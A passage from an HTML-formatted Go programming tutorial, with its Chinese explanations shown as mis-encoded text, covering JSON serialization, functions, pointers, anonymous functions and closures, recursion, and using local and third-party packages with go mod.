&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//jsonåºåˆ—åŒ–</span></span><br><span class="line">	data, _ := json.Marshal(employees)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">	<span class="keyword">var</span> decoded []Employee</span><br><span class="line">	json.Unmarshal(data, &amp;decoded)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, decoded)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœ</span></span><br><span class="line">[&#123;<span class="string">&quot;ID&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;John&quot;</span>,<span class="string">&quot;LastName&quot;</span>:<span class="string">&quot;Doe&quot;</span>,<span class="string">&quot;address&quot;</span>:<span class="string">&quot;balabala&quot;</span>,<span class="string">&quot;ManagerID&quot;</span>:<span class="number">0</span>&#125;,&#123;<span class="string">&quot;ID&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;David&quot;</span>,<span class="string">&quot;LastName&quot;</span>:<span class="string">&quot;Campbell&quot;</span>,<span class="string">&quot;ManagerID&quot;</span>:<span class="number">0</span>&#125;]</span><br><span class="line">[&#123;&#123;<span class="number">0</span> John Doe balabala&#125; <span class="number">0</span>&#125; &#123;&#123;<span class="number">0</span> David Campbell &#125; <span class="number">0</span>&#125;]</span><br></pre></td></tr></table></figure>



<p>åºåˆ—åŒ–è¯¦ç»†çŸ¥è¯†ï¼š<a href="https://sanyuesha.com/2018/05/07/go-json/">https://sanyuesha.com/2018/05/07/go-json/</a></p>
<h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">name</span><span class="params">(parameters)</span> <span class="params">(results)</span></span> &#123;</span><br><span class="line">    body-content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°ç±»ä¼¼jsçš„è¯­æ³•</p>
<p>å¯ä»¥å¸¦å¤šä¸ªè¿”å›å€¼</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//ä»å‘½ä»¤è¡Œè¯»å–ä¸¤ä¸ªå‚æ•°ä¼ å…¥calcå‡½æ•°ï¼Œæ³¨æ„ä¸‹æ ‡ä¸æ˜¯ä»0å¼€å§‹</span></span><br><span class="line">	add_sum, mul_sum := calc(os.Args[<span class="number">1</span>], os.Args[<span class="number">2</span>])</span><br><span class="line">    fmt.Println(add_sum, mul_sum)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¤šä¸ªè¿”å›å€¼çš„æ—¶å€™æ ‡æ³¨è¿”å›å€¼ç±»å‹(å‚æ•°1ç±»å‹ï¼Œå‚æ•°2ç±»å‹)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calc</span><span class="params">(number1 <span class="keyword">string</span>, number2 <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">   <span class="comment">//str-&gt;int </span></span><br><span class="line">	int1, _ := strconv.Atoi(number1)</span><br><span class="line">	int2, _ := strconv.Atoi(number2)</span><br><span class="line">	sum := int1 + int2</span><br><span class="line">	mul := int1 * int2</span><br><span class="line">	<span class="keyword">return</span> sum, mul</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€‹    </p>
<h4 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h4><ul>
<li><code>&amp;</code> è¿ç®—ç¬¦ä½¿ç”¨å…¶åå¯¹è±¡çš„åœ°å€ã€‚</li>
<li><code>*</code> è¿ç®—ç¬¦å–æ¶ˆå¼•ç”¨æŒ‡é’ˆã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¯ä»¥å‰å¾€æŒ‡é’ˆä¸­åŒ…å«çš„åœ°å€è®¿é—®å…¶ä¸­çš„å¯¹è±¡ã€‚</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    firstName := <span class="string">&quot;John&quot;</span></span><br><span class="line">    updateName(&amp;firstName)</span><br><span class="line">    fmt.<span class="built_in">println</span>(firstName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateName</span><span class="params">(name *<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    *name = <span class="string">&quot;David&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å°†Johnæ”¹æˆäº†David</span></span><br></pre></td></tr></table></figure>

<p>ã€€#### åŒ¿åå‡½æ•°<br>1ã€ä¸å¸¦å‚æ•°</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f:=<span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   f()<span class="comment">//hello world</span></span><br><span class="line">   fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, f) <span class="comment">//æ‰“å° func()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€å¸¦å‚æ•°</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f:=<span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span></span>&#123;</span><br><span class="line">      fmt.Println(args)</span><br><span class="line">   &#125;</span><br><span class="line">   f(<span class="string">&quot;hello world&quot;</span>)<span class="comment">//hello world</span></span><br><span class="line">   <span class="comment">//æˆ–</span></span><br><span class="line">   (<span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span></span>&#123;</span><br><span class="line">        fmt.Println(args)</span><br><span class="line">    &#125;)(<span class="string">&quot;hello world&quot;</span>)<span class="comment">//hello world</span></span><br><span class="line">    <span class="comment">//æˆ–</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">        fmt.Println(args)</span><br><span class="line">    &#125;(<span class="string">&quot;hello world&quot;</span>) <span class="comment">//hello world</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3ã€å¸¦è¿”å›å€¼</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f:=<span class="function"><span class="keyword">func</span><span class="params">()</span><span class="title">string</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">   a:=f()</span><br><span class="line">   fmt.Println(a)<span class="comment">//hello world</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4ã€å¤šä¸ªåŒ¿åå‡½æ•°</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f1,f2:=F(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">   fmt.Println(f1(<span class="number">4</span>))<span class="comment">//6</span></span><br><span class="line">   fmt.Println(f2())<span class="comment">//6</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">(x, y <span class="keyword">int</span>)</span><span class="params">(<span class="keyword">func</span>(<span class="keyword">int</span>)</span><span class="title">int</span>,<span class="title">func</span><span class="params">()</span><span class="title">int</span>)</span> &#123;</span><br><span class="line">   f1 := <span class="function"><span class="keyword">func</span><span class="params">(z <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (x + y) * z / <span class="number">2</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   f2 := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span> * (x + y)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> f1,f2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="é—­åŒ…ï¼ˆclosureï¼‰"><a href="#é—­åŒ…ï¼ˆclosureï¼‰" class="headerlink" title="é—­åŒ…ï¼ˆclosureï¼‰"></a>é—­åŒ…ï¼ˆclosureï¼‰</h4><p>é—­åŒ…ï¼šè¯´ç™½äº†å°±æ˜¯å‡½æ•°çš„åµŒå¥—ï¼Œ<strong>å†…å±‚çš„å‡½æ•°å¯ä»¥ä½¿ç”¨å¤–å±‚å‡½æ•°çš„æ‰€æœ‰å˜é‡ï¼Œå³ä½¿å¤–å±‚å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•</strong>ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<p>1ã€</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := Fun()</span><br><span class="line">    b:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">    c:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">    fmt.Println(b)<span class="comment">//worldhello </span></span><br><span class="line">    fmt.Println(c)<span class="comment">//worldhello hello </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Fun</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    a := <span class="string">&quot;world&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">        a += args</span><br><span class="line">        <span class="keyword">return</span>  a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2ã€</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   a := Fun()</span><br><span class="line">   d := Fun()</span><br><span class="line">   b:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   c:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   e:=d(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   f:=d(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   fmt.Println(b)<span class="comment">//worldhello</span></span><br><span class="line">   fmt.Println(c)<span class="comment">//worldhello hello</span></span><br><span class="line">   fmt.Println(e)<span class="comment">//worldhello</span></span><br><span class="line">   fmt.Println(f)<span class="comment">//worldhello hello</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Fun</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   a := <span class="string">&quot;world&quot;</span></span><br><span class="line">   <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">      a += args</span><br><span class="line">      <span class="keyword">return</span>  a</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ä¸¤æ¬¡è°ƒç”¨F()ï¼Œç»´æŠ¤çš„ä¸æ˜¯åŒä¸€ä¸ªaå˜é‡ã€‚</p>
<p>3ã€</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   a := F()</span><br><span class="line">   a[<span class="number">0</span>]()<span class="comment">//0xc00004c080 3</span></span><br><span class="line">   a[<span class="number">1</span>]()<span class="comment">//0xc00004c080 3</span></span><br><span class="line">   a[<span class="number">2</span>]()<span class="comment">//0xc00004c080 3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> []<span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">   b := <span class="built_in">make</span>([]<span class="function"><span class="keyword">func</span><span class="params">()</span>, 3, 3)</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">      b[i] = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">         fmt.Println(&amp;i,i)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é—­åŒ…é€šè¿‡å¼•ç”¨çš„æ–¹å¼ä½¿ç”¨å¤–éƒ¨å‡½æ•°çš„å˜é‡ã€‚ä¾‹ä¸­åªè°ƒç”¨äº†ä¸€æ¬¡å‡½æ•°F,æ„æˆä¸€ä¸ªé—­åŒ…ï¼Œi åœ¨å¤–éƒ¨å‡½æ•°Bä¸­å®šä¹‰ï¼Œæ‰€ä»¥é—­åŒ…ç»´æŠ¤è¯¥å˜é‡ i ï¼Œa[0]ã€a[1]ã€a[2]ä¸­çš„ i éƒ½æ˜¯é—­åŒ…ä¸­ i çš„å¼•ç”¨ã€‚å› æ­¤æ‰§è¡Œ,i çš„å€¼å·²ç»å˜ä¸º3ï¼Œæ•…å†è°ƒç”¨a<a href="">0</a>æ—¶çš„è¾“å‡ºæ˜¯3è€Œä¸æ˜¯0ã€‚</p>
<p>4ã€å¦‚ä½•é¿å…ä¸Šé¢çš„BUG ï¼Œç”¨ä¸‹é¢çš„æ–¹æ³•ï¼Œæ³¨æ„å’Œä¸Šé¢ç¤ºä¾‹å¯¹æ¯”ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := F()</span><br><span class="line">    a[<span class="number">0</span>]() <span class="comment">//0xc00000a0a8 0</span></span><br><span class="line">    a[<span class="number">1</span>]() <span class="comment">//0xc00000a0c0 1</span></span><br><span class="line">    a[<span class="number">2</span>]() <span class="comment">//0xc00000a0c8 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> []<span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="function"><span class="keyword">func</span><span class="params">()</span>, 3, 3)</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        b[i] = (<span class="function"><span class="keyword">func</span><span class="params">(j <span class="keyword">int</span>)</span> <span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">                fmt.Println(&amp;j, j)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)(i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := F()</span><br><span class="line">    a[<span class="number">0</span>]() <span class="comment">//0xc00004c080 0</span></span><br><span class="line">    a[<span class="number">1</span>]() <span class="comment">//0xc00004c088 1</span></span><br><span class="line">    a[<span class="number">2</span>]() <span class="comment">//0xc00004c090 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> []<span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="function"><span class="keyword">func</span><span class="params">()</span>, 3, 3)</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        j := i</span><br><span class="line">        b[i] = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            fmt.Println(&amp;j, j)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¯æ¬¡ æ“ä½œä»…å°†åŒ¿åå‡½æ•°æ”¾å…¥åˆ°æ•°ç»„ä¸­ï¼Œä½†å¹¶æœªæ‰§è¡Œï¼Œå¹¶ä¸”å¼•ç”¨çš„å˜é‡éƒ½æ˜¯ iï¼Œéšç€ i çš„æ”¹å˜åŒ¿åå‡½æ•°ä¸­çš„ i ä¹Ÿåœ¨æ”¹å˜ï¼Œæ‰€ä»¥å½“æ‰§è¡Œè¿™äº›å‡½æ•°æ—¶ï¼Œä»–ä»¬è¯»å–çš„éƒ½æ˜¯ç¯å¢ƒå˜é‡ i æœ€åä¸€æ¬¡çš„å€¼ã€‚è§£å†³çš„æ–¹æ³•å°±æ˜¯æ¯æ¬¡å¤åˆ¶å˜é‡ i ç„¶åä¼ åˆ°åŒ¿åå‡½æ•°ä¸­ï¼Œè®©é—­åŒ…çš„ç¯å¢ƒå˜é‡ä¸ç›¸åŒã€‚</p>
<p>5ã€</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(F())<span class="comment">//2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> <span class="params">(r <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      r++</span><br><span class="line">   &#125;()</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœä¸º2ï¼Œå³å…ˆæ‰§è¡Œr=1 ,å†æ‰§è¡Œr++ã€‚</p>
<p>6ã€é€’å½’å‡½æ•°</p>
<p>è¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯å¿…é¡»ç”¨éƒ½é—­åŒ…ï¼Œå°±æ˜¯é€’å½’å‡½æ•°ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">   <span class="keyword">if</span> i &lt;= <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> i * F(i<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> i <span class="keyword">int</span> = <span class="number">3</span></span><br><span class="line">   fmt.Println(i, F(i))<span class="comment">// 3 6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>7ã€æ–æ³¢é‚£å¥‘æ•°åˆ—(Fibonacci)</p>
<p>è¿™ä¸ªæ•°åˆ—ä»ç¬¬3é¡¹å¼€å§‹ï¼Œæ¯ä¸€é¡¹éƒ½ç­‰äºå‰ä¸¤é¡¹ä¹‹å’Œã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonaci</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonaci(i<span class="number">-1</span>) + fibonaci(i<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d\n&quot;</span>, fibonaci(i))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°ç»“ï¼š</p>
<p>åŒ¿åå‡½æ•°å’Œé—­åŒ…å…¶å®æ˜¯ä¸€å›äº‹å„¿ï¼ŒåŒ¿åå‡½æ•°å°±æ˜¯é—­åŒ…ã€‚åŒ¿åå‡½æ•°ç»™ç¼–ç¨‹å¸¦æ¥çµæ´»æ€§çš„åŒæ—¶ä¹Ÿå®¹æ˜“äº§ç”Ÿbugï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹å½“ä¸­è¦å¤šæ³¨æ„å‡½æ•°çš„å‚æ•°ï¼ŒåŠå¯æ¥å—çš„å‚æ•°çš„é—®é¢˜ã€‚</p>
<h3 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h3><h4 id="æœ¬åœ°åŒ…"><a href="#æœ¬åœ°åŒ…" class="headerlink" title="æœ¬åœ°åŒ…"></a>æœ¬åœ°åŒ…</h4><p>goä¸­æ¨¡å—å¯ä»¥ç”¨æ¥å¯¼å…¥åˆ°å…¶ä»–çš„åŒ…ä¸­ï¼Œ</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰äº†ä¸€ä¸ªè®¡ç®—å™¨æ¨¡å—</span></span><br><span class="line"><span class="comment">//é¦–å­—æ¯å¤§å†™çš„å‡½æ•°æˆ–è€…å˜é‡å¯ä»¥è¢«å¤–éƒ¨è®¿é—®ç›¸å½“äºpublic</span></span><br><span class="line"><span class="comment">//é¦–å­—æ¯å°å†™çš„ç›¸å½“äºprivate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> calculator</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> logMessage = <span class="string">&quot;[LOG]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Version of the calculator</span></span><br><span class="line"><span class="keyword">var</span> Version = <span class="string">&quot;1.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">internalSum</span><span class="params">(number <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> number - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sum two integer numbers</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(number1, number2 <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> number1 + number2</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¼–å†™å®Œä¹‹åä½¿ç”¨ <code> go mod  init ç»™æ¨¡å—å–ä¸ªåå­—</code>ï¼Œæ¯”å¦‚<code>go mod  init github.com/myuser/calculator</code></p>
<p>å½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªgo.modè¿™é‡Œæ˜¯ç›¸å½“äºè¿™ä¸ªâ€è®¡ç®—å™¨â€åŒ…çš„ä¾èµ–å’Œç¯å¢ƒç±»ä¼¼pyçš„requirements.txt</p>
<p>ä¾èµ–ç„¶åå°±å¯ä»¥åœ¨mainåŒ…ä¸­è°ƒç”¨è¿™ä¸ªåŒ…,ä½¿ç”¨import</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/myuser/calculator&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	total := calculator.Sum(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">	fmt.Println(total)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Version: &quot;</span>, calculator.Version)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶å<code>go mod init helloworld</code>,ç„¶åç”Ÿæˆäº†è¿™ä¸ªåŒ…çš„ä¾èµ–</p>
<p>ç»™go.modå¢åŠ å‡ è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">require github.com/myuser/calculator v0.0.0</span><br><span class="line"></span><br><span class="line">replace github.com/myuser/calculator =&gt; ../calculator</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨æœ¬åœ°åŒ…</p>
<h4 id="è°ƒç”¨ç¬¬ä¸‰æ–¹åŒ…"><a href="#è°ƒç”¨ç¬¬ä¸‰æ–¹åŒ…" class="headerlink" title="è°ƒç”¨ç¬¬ä¸‰æ–¹åŒ…"></a>è°ƒç”¨ç¬¬ä¸‰æ–¹åŒ…</h4><p>ä½¿ç”¨<code>go getã€€xxx</code>æ¥è¿›è¡Œç¬¬ä¸‰æ–¹åŒ…çš„å®‰è£…ï¼Œgo getçš„å°±æ˜¯git cloneå’Œgo installçš„ä¸¤ä¸ªå‘½ä»¤çš„é›†åˆ</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;rsc.io/quote&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(quote.Hello())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶å<code>go run main.go</code>å³å¯</p>
<p>æœ‰æ—¶å¯èƒ½éœ€è¦é‡å»ºä¾èµ–<code>go mod tidy</code></p>
<p><strong>vscodeä¸­å¦‚æœå¯¼å…¥äº†ç¬¬ä¸‰åŒ…å‡ºç°é£˜çº¢æƒ…å†µï¼Œæ˜¯æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ä¸å¯¹ï¼Œæ‰¾åˆ°å’Œå½“å‰é¡¹ç›®go.modæ‰€åœ¨çš„ç›®å½•æ‰“å¼€æ–‡ä»¶å¤¹</strong></p>
